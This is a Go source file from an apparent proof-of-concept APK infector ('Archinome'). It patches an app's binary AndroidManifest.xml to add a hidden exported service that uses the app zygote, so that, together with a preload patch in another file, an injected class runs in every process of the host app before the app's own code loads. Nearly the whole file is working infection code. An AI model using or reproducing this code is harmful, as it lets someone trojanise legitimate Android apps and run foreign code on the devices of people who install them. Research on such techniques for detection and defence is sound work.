package manifest

// Zygote-service injection vector + the shared in-place AXML editor.
//
// Injects <service android:name="aaaaaaaaaaaa.ArchinomeZygoteService"
// android:exported="true" android:isolatedProcess="true"
// android:useAppZygote="true"/> as the first child of <application>.
//
// Why this shape: android:useAppZygote makes the platform start the service in
// the *app zygote*, and android:zygotePreloadName (appattr_patch.go) makes that
// zygote preload a class of ours in every process it forks. The preload runs
// before the host's own Application exists and before its dex is loaded; the
// service is only the handle that keeps useAppZygote legal (the platform
// requires a service with that attribute to exist for the app to get an app
// zygote). isolatedProcess=true keeps the handle out of the host's address
// space.
//
// Binary AXML surgery, same approach as PatchReceiver / PatchProvider:
//   1. append the strings this vector needs (tag name, class name) and, for
//      every attribute name the host resource map does not cover yet, the name
//      string plus its resource-map slot (see axPatch.ensureAttr)
//   2. insert <service .../> right after the <application> start tag. AXML has
//      no self-closing form: the element is a START_TAG chunk followed by an
//      END_TAG chunk, like the injected <receiver>
//   3. fix the AXML total size
//
// Two invariants are easy to break by hand and are enforced here:
//
//   - An AXML attribute name is a string-pool index that is *also* an index into
//     the resource map (the two arrays are index-aligned), so an attribute name
//     the host map does not know has to be appended to both at the same index.
//   - The attribute list of every element must stay sorted by ascending
//     RESOLVED resource id. libandroidfw locates an attribute with a binary
//     search over the ids obtained from the resource map, so an out-of-order
//     attribute is silently ignored by PackageManagerService (this is the bug
//     documented at length in patcher.go/attr_order_test.go).

import (
	"fmt"
	"log"
	"os"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	applicationTagStr     = "application"
	serviceTagStr         = "service"
	instrumentationTagStr = "instrumentation"

	// injection classes, all in the aaaaaaaaaaaa package the demuxer/stub dex
	// ships (payload_zygote.dex, payload_backupagent.dex)
	serviceClassName         = "aaaaaaaaaaaa.ArchinomeZygoteService"
	instrumentationClassName = "aaaaaaaaaaaa.ArchinomeInstrumentation"
	backupAgentClassName     = "aaaaaaaaaaaa.ArchinomeBackupAgent"
	zygotePreloadClassName   = "aaaaaaaaaaaa.ArchinomeZygotePreload"

	// framework attribute resource ids
	// (frameworks/base/core/res/res/values/attrs_manifest.xml; read off
	// framework-res.apk). resIDName / resIDExported live in provider_patch.go /
	// receiver_patch.go.
	resIDTargetPackage     = 0x01010021
	resIDFunctionalTest    = 0x01010023
	resIDBackupAgent       = 0x0101027f
	resIDAllowBackup       = 0x01010280
	resIDIsolatedProcess   = 0x010103a9
	resIDUseAppZygote      = 0x01010597
	resIDZygotePreloadName = 0x0101059d

	// an AXML boolean true is a Res_value with type 0x12 and data all-ones
	attrBoolTrue = 0xFFFFFFFF

	// size of one ResXMLTree_attribute
	attrSlotSize = 20
)

// ------------------------------------------------------------- shared AXML surgery

// axPatch accumulates in-place edits over one binary AndroidManifest.xml: growth
// of the string pool, growth of the resource map, attribute splices and raw
// value overwrites. Every offset recorded here refers to the ORIGINAL image, so
// the edits compose without recomputing positions (applyEdits sorts them and
// splices front to back).
type axPatch struct {
	data       []byte
	pool       *stringPool
	androidNs  uint32
	resMapOff  int
	resMapSize int
	resIDs     []uint32

	newStrings []string       // appended to the pool, they land at pool.stringCount..
	newResIDs  []uint32       // appended to the map (zeros are legal padding slots)
	filled     map[int]uint32 // existing map slots filled in place: index -> resID

	attrGrowth map[int]int // element start -> number of attributes already added
	edits      []axEdit
	grown      int // bytes added to the file by the splices in edits
}

func newAxPatch(data []byte) *axPatch {
	pool := parseStringPool(data)
	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}
	resIDs, resMapOff, resMapSize := readResMap(data)
	return &axPatch{
		data:       data,
		pool:       pool,
		androidNs:  uint32(androidNs),
		resMapOff:  resMapOff,
		resMapSize: resMapSize,
		resIDs:     resIDs,
		attrGrowth: map[int]int{},
		filled:     map[int]uint32{},
	}
}

// allResIDs is the resource map as it will look after the growth recorded so far.
func (p *axPatch) allResIDs() []uint32 {
	ids := append([]uint32{}, p.resIDs...)
	for i, id := range p.filled {
		ids[i] = id
	}
	return append(ids, p.newResIDs...)
}

// addString returns the pool index of s, appending it to the pool when it is not
// there yet.
func (p *axPatch) addString(s string) uint32 {
	if idx := p.pool.indexOf(p.data, s); idx >= 0 {
		return uint32(idx)
	}
	for i, ex := range p.newStrings {
		if ex == s {
			return uint32(p.pool.stringCount + i)
		}
	}
	return p.appendPoolSlot(s)
}

// appendPoolSlot appends a string to the pool without deduplicating; used when
// the wanted text has to land at a specific index (see ensureAttr).
func (p *axPatch) appendPoolSlot(s string) uint32 {
	idx := uint32(p.pool.stringCount + len(p.newStrings))
	p.newStrings = append(p.newStrings, s)
	return idx
}

// ensureAttr returns the index to write into an attribute's name field for the
// framework attribute resID.
//
// The index is used twice by the platform: as a string-pool index (aapt2-style
// dumpers) and as a resource-map index (the map is index-aligned with the pool).
// A host that never declared the attribute (android:useAppZygote,
// android:zygotePreloadName on older builds) therefore needs the name string AND
// the resource id appended at the same index, which means padding whichever of
// the two arrays is shorter. A pre-existing slot that carries a different id is
// left alone and a fresh slot is appended instead.
func (p *axPatch) ensureAttr(resID uint32, name string) uint32 {
	// already resolved by this very patch run (fresh slots carry the id)
	for i, id := range p.newResIDs {
		if id == resID {
			return uint32(len(p.resIDs) + i)
		}
	}
	for i, id := range p.filled {
		if id == resID {
			return uint32(i)
		}
	}
	for i, id := range p.resIDs {
		if id == resID {
			return uint32(i)
		}
	}

	// The name string is already in the pool: it must keep its index, and the
	// resource map has to agree with it.
	for i := 0; i < p.pool.stringCount; i++ {
		if p.pool.decode(p.data, i) != name {
			continue
		}
		if i < len(p.resIDs) {
			// the slot exists but is empty (aapt2 writes a zero entry for a
			// non-framework attribute name): fill it in place
			p.edits = append(p.edits, axEdit{p.resMapOff + 8 + i*4, u32bytes(resID), true})
			p.filled[i] = resID
		} else {
			for len(p.resIDs)+len(p.newResIDs) < i {
				p.newResIDs = append(p.newResIDs, 0)
			}
			p.newResIDs = append(p.newResIDs, resID)
		}
		return uint32(i)
	}

	// Nothing to reuse: the name goes to a fresh index that both arrays reach.
	idx := len(p.resIDs)
	if sc := p.pool.stringCount + len(p.newStrings); sc > idx {
		idx = sc
	}
	for p.pool.stringCount+len(p.newStrings) < idx {
		p.appendPoolSlot("") // padding: the name must land on idx
	}
	for len(p.resIDs)+len(p.newResIDs) < idx {
		p.newResIDs = append(p.newResIDs, 0)
	}
	p.appendPoolSlot(name)
	p.newResIDs = append(p.newResIDs, resID)
	return uint32(idx)
}

// attrSpec describes one attribute to add to an existing element.
type attrSpec struct {
	resID    uint32
	name     string // attribute name, as it must appear in the string pool
	valueIdx uint32 // string-pool index of the value (dataType 0x03 only)
	dataType uint8
	data     uint32 // typed value for non-string types
}

// buildAttr encodes the attribute as a 20-byte ResXMLTree_attribute. For a
// string attribute both the raw value and the typed value hold the pool index of
// the string, exactly like aapt2 writes it.
func (p *axPatch) buildAttr(s attrSpec) []byte {
	nameIdx := p.ensureAttr(s.resID, s.name)
	data, raw := s.data, s.data
	if s.dataType == uint8(AttrTypeString) {
		data, raw = s.valueIdx, s.valueIdx
	}
	b := make([]byte, attrSlotSize)
	putAttr(b, 0, p.androidNs, nameIdx, raw, s.dataType, data)
	return b
}

// insertAttrs splices attrs (which must be in ascending resID order) into the
// start tag of the element at elemStart, keeping the list sorted by resolved
// resource id, and grows the element by one 20-byte slot per attribute.
//
// attrInsertOffset resolves each insertion point against the ORIGINAL attribute
// list, and applyEdits sorts stably, so two attributes that belong at the same
// position keep the order they are given in - the ascending one.
func (p *axPatch) insertAttrs(elemStart int, specs []attrSpec) {
	if len(specs) == 0 {
		return
	}
	for i := 1; i < len(specs); i++ {
		if specs[i].resID <= specs[i-1].resID {
			log.Panicf("attributes must be added in ascending resource-id order: 0x%08x after 0x%08x",
				specs[i].resID, specs[i-1].resID)
		}
	}

	elemSize := int(leU32(p.data, elemStart+4))
	attrCount := int(leU16(p.data, elemStart+28))
	// attrInsertOffset is fed the original count: every position it returns is
	// an offset into the original list.
	for _, s := range specs {
		off := attrInsertOffset(p.data, elemStart, attrCount, s.resID)
		p.edits = append(p.edits, axEdit{off, p.buildAttr(s), false})
	}

	added := p.attrGrowth[elemStart] + len(specs)
	p.attrGrowth[elemStart] = added
	p.edits = append(p.edits,
		axEdit{elemStart + 4, u32bytes(uint32(elemSize + attrSlotSize*added)), true},
		axEdit{elemStart + 28, u16bytes(uint16(attrCount + added)), true},
	)
	p.grown += attrSlotSize * len(specs)
}

// insertElement splices a whole element (start tag + children + end tag) at off.
func (p *axPatch) insertElement(off int, chunk []byte) {
	p.edits = append(p.edits, axEdit{off, chunk, false})
	p.grown += len(chunk)
}

// repointStringAttr overwrites the value of an existing string attribute in
// place: raw value and typed value both point at strIdx. No size changes.
func (p *axPatch) repointStringAttr(a xmlAttr, strIdx uint32) {
	p.edits = append(p.edits,
		axEdit{a.off + 8, u32bytes(strIdx), true},
		axEdit{a.off + 16, u32bytes(strIdx), true},
	)
}

// setBooleanTrue forces an existing attribute to hold boolean true in place. The
// slot keeps its size, so no other offset in the file moves; only the dataType
// byte is touched when the attribute was not already a boolean.
func (p *axPatch) setBooleanTrue(a xmlAttr) {
	if a.dataType != uint8(AttrTypeIntBool) {
		p.edits = append(p.edits, axEdit{a.off + 15, []byte{uint8(AttrTypeIntBool)}, true})
	}
	p.edits = append(p.edits, axEdit{a.off + 16, u32bytes(attrBoolTrue), true})
}

// commit writes the accumulated edits out as a new image and logs the size change.
func (p *axPatch) commit(what string) []byte {
	oldDataSize := p.pool.size - p.pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range p.newStrings {
		enc := encodeString(p.pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}
	newStringCount := p.pool.stringCount + len(p.newStrings)
	newStringsStart := p.pool.stringsStart + len(p.newStrings)*4
	newPoolSize := p.pool.size + len(newOffsetBytes) + len(newStringBytes)
	// chunks are laid out back to back: keep the pool 4-byte aligned
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	newTotal := len(p.data) + (newPoolSize - p.pool.size) + len(p.newResIDs)*4 + p.grown

	edits := make([]axEdit, 0, len(p.edits)+8)
	edits = append(edits, p.edits...)
	if len(p.newStrings) > 0 {
		edits = append(edits,
			axEdit{p.pool.off + 4, u32bytes(uint32(newPoolSize)), true},
			axEdit{p.pool.off + 8, u32bytes(uint32(newStringCount)), true},
			axEdit{p.pool.off + 20, u32bytes(uint32(newStringsStart)), true},
			axEdit{p.pool.off + 28 + p.pool.stringCount*4, newOffsetBytes, false},
			axEdit{p.pool.off + p.pool.size, newStringBytes, false},
		)
	}
	if len(p.newResIDs) > 0 {
		blob := make([]byte, 0, len(p.newResIDs)*4)
		for _, id := range p.newResIDs {
			blob = append(blob, u32bytes(id)...)
		}
		edits = append(edits,
			axEdit{p.resMapOff + 4, u32bytes(uint32(p.resMapSize + len(blob))), true},
			axEdit{p.resMapOff + p.resMapSize, blob, false},
		)
	}
	// the AXML total size is the first chunk's size field
	edits = append(edits, axEdit{axmlSizeOff, u32bytes(uint32(newTotal)), true})

	out := applyEdits(p.data, newTotal, edits)
	log.Printf("%s injected (manifest size 0x%x -> 0x%x)", what, len(p.data), len(out))
	return out
}

// findApplicationElement returns the offset of the <application> start tag.
func findApplicationElement(data []byte, pool *stringPool) int {
	root := firstTagStart(data)
	if root < 0 {
		log.Panic("no <manifest> root tag found")
	}
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == applicationTagStr {
			return c.startOff
		}
	}
	log.Panic("<application> not found")
	return -1
}

// assertAscendingResIDs guards the repository invariant on an element built by
// hand: the resolved resource ids of its attributes must be non-decreasing.
func assertAscendingResIDs(resIDs []uint32, attrs []elemAttr) {
	prev := uint32(0)
	for i, a := range attrs {
		id := attrNameResID(resIDs, a.nameIdx)
		if i > 0 && id < prev {
			log.Panicf("attribute %d (resource id 0x%08x) breaks the ascending order (previous 0x%08x)", i, id, prev)
		}
		prev = id
	}
}

// ------------------------------------------------------------- entry point

// PatchZygoteService injects the app-zygote service into the binary manifest at
// utils.ManifestBinaryPath and rewrites it in place.
func PatchZygoteService() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)
	if idx := pool.indexOf(data, serviceClassName); idx >= 0 {
		fmt.Printf("\t--%s already declared in the manifest; nothing to add\n", serviceClassName)
		return
	}

	p := newAxPatch(data)
	appStart := findApplicationElement(data, p.pool)

	tagIdx := p.addString(serviceTagStr)
	classIdx := p.addString(serviceClassName)
	attrs := []elemAttr{
		{p.androidNs, p.ensureAttr(resIDName, "name"), classIdx, uint8(AttrTypeString), classIdx},
		{p.androidNs, p.ensureAttr(resIDExported, "exported"), attrBoolTrue, uint8(AttrTypeIntBool), attrBoolTrue},
		{p.androidNs, p.ensureAttr(resIDIsolatedProcess, "isolatedProcess"), attrBoolTrue, uint8(AttrTypeIntBool), attrBoolTrue},
		{p.androidNs, p.ensureAttr(resIDUseAppZygote, "useAppZygote"), attrBoolTrue, uint8(AttrTypeIntBool), attrBoolTrue},
	}
	assertAscendingResIDs(p.allResIDs(), attrs)

	// AXML has no self-closing tags: the element is START_TAG + END_TAG
	element := append(buildStartTag(tagIdx, attrs), buildEndTag(tagIdx)...)
	appSize := int(leU32(data, appStart+4))
	p.insertElement(appStart+appSize, element)

	out := p.commit("<service " + serviceClassName + ">")
	utils.WriteChanges(out, utils.ManifestBinaryPath)
}
